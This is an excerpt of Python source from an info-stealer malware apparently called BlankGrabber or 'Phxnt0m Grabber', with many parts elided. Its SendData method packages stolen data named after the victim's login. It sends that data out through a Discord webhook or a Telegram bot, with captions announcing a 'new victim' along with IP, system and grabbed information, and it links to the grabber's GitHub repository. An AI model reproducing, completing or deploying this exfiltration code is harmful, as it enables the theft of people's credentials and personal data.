...
class BlankGrabber:
    ...
    def SendData(self) -> None: # Sends data to the webhook
        ...
        filename = "Phxnt0m-%s.%s" % (os.getlogin(), extention)
        ...
        match Settings.C2[0]:
            case 0: # Discord Webhook
                image_url = "https://cdn.discordapp.com/attachments/1138145177861632002/1150425159040237628/112121.jpg"
                image_url1 = "https://cdn.discordapp.com/attachments/1138145177861632002/1150434405878345808/oni_1.png"
                    ...
                    "embeds": [
                        {
                            ...
                            "color": 34303,
                            "footer": {
                                "text": "Grabbed by a Phantom | https://github.com/Phxnt0m1/Phxnt0mWare-Grabber"
                            },
                            "thumbnail": {
                                "url": image_url
                            }
            ...
            case 1: # Telegram Bot
                payload = {
                    'caption': f'<b>Phxnt0m Grabber</b> got a new victim: <b>{os.getlogin()}</b>\n\n<b>IP Info</b>\n<code>{ipinfo}</code>\n\n<b>System Info</b>\n<code>{system_info}</code>\n\n<b>Grabbed Info</b>\n<code>{grabbedInfo}</code>'.strip(), 
                    'parse_mode': 'HTML'
                }
